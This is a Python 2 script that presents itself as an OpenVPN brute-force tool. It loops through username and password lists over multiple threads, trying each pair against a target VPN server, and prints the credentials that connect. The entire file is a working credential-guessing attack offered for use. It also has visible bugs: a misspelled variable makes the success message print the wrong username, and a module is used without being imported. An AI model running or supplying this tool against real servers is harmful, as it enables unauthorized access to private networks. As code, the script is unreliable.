"""
OpenVPN Brute Force Tool
"""


import os
import sys
import time
import string
import random
import argparse
import subprocess

from Queue import Queue
from threading import Thread


IsSuccess = False
OpenVPNPath = "/usr/sbin/openvpn"


def read_list_from_file(filename):

    items = list()

    if os.path.isfile(filename):
        for line in open(filename, 'rb'):
            items.append(line.strip())
    else:
        print '[!] Invalid File: ' + filename

    return items


def random_string(length):

    out = ''

    for i in range(length):
        out += random.choice(string.ascii_letters + string.digits)

    return out
    

def openvpn_bruteforce(task):

    global IsSuccess, OpenVPNPath
    
    while True:

        ip, port, config, uaer, password = task.get()

        if IsSuccess:
            task.task_done()
            continue

        auth_file = os.path.join('/tmp', 'ovbf_' + random_string(8))
        fp = open(auth_file, 'wb')
        fp.write(uaer + '\n')
        fp.write(password + '\n')
        fp.close()
        
        openvpn_cmd = "%s --remote %s %s --auth-user-pass %s --tls-exit --connect-retry-max 0 --config %s" % (
            OpenVPNPath, ip, port, auth_file, config)
        
        proc = subprocess.Popen(openvpn_cmd.split(), shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        for line in iter(proc.stdout.readline, ''):
            if line.find('Initialization Sequence Completed') != -1:
                print "OPENVPN-SUCCESS: " + ip + ":" + str(port) + " - " + user + "/" + password
                IsSuccess = True
                os.kill(proc.pid, signal.SIGQUIT)

        os.remove(auth_file)

        task.task_done()
    

if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='OpenVPN Brute Force Tool')
    group1 = parser.add_mutually_exclusive_group(required=True)
    group1.add_argument('-u', '--user', action='store', help='user name')
    group1.add_argument('-U', '--user-file', action='store', help='user name file')
    group2 = parser.add_mutually_exclusive_group(required=True)
    group2.add_argument('-p', '--password', action='store', help='password')
    group2.add_argument('-P', '--password-file', action='store', help='password file')
    parser.add_argument('-i', '--ip', action='store', help='IP address', required=True)
    parser.add_argument('-c', '--config', action='store', help='config file', required=True)
    parser.add_argument('--port', action='store', type=int, default=443, help='port')
    parser.add_argument('-t', '--threads', action='store', type=int, default=10, help='threads')

    args = parser.parse_args()

    users = list()
    passwords = list()

    if args.user:
        users.append(args.user)
    elif args.user_file:
        users = read_list_from_file(args.user_file)
    
    if args.password:
        passwords.append(args.password)
    elif args.password_file:
        passwords = read_list_from_file(args.password_file)

    if len(users) == 0 or len(passwords) == 0:
        exit(0)

    if os.path.isfile(args.config) == False:
        print '[!] Invalid File: ' + args.config
        exit(0)

    task = Queue(maxsize=0)

    for i in range(args.threads):
      worker = Thread(target = openvpn_bruteforce, args = (task,))
      worker.setDaemon(True)
      worker.start()

    for user in users:
        for password in passwords:
            task.put((args.ip, args.port, args.config, user, password))
    
    task.join()
